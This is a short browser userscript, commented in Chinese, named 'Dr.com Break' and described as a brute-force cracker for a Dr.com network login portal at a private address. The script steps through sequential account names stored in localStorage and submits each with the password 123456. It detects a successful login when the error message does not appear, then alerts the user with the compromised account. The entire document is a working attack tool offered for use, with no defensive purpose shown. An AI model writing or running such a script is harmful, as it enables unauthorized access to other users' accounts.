// ==UserScript==
// @name       Dr.com Break
// @namespace  http://com.Find1X.drcomBreak/
// @version    0.1.1
// @description  Dr.com 登陆系统暴力破解脚本
// @match      http://172.31.0.10/
// @copyright  2013+, Litpo Team & FindiX Studio 
// ==/UserScript==

//首先需要在js控制台输入
//		window.localStorage.n=你希望开始尝试的账号名
//声明并初始化用户名
var n = window.localStorage.n;
if (document.getElementsByName('DDDDD').length != 0) {
	var user = document.getElementsByName('DDDDD'); //获取用户名
	var pass = document.getElementsByName('upass'); //获取密码
	user[0].value = n;
	pass[0].value = 123456; //希望尝试的密码
	n++;
	window.localStorage.n = n;
	document.getElementsByName('0MKKey')[0].click();
} else {
	if (document.getElementsByClassName('f1')[2].innerHTML.toString() != '<script language="javascript">DispTFM()</script>帐号或密码不对，请重新输入') {
		window.localStorage.result = n-1;
		alert('找到一个账号！\n账号为'+(n-1));
	} else {
		document.getElementsByClassName('f1')[3].firstChild.click();
	}
}
//扫描出之后会停止脚本并弹窗输出账号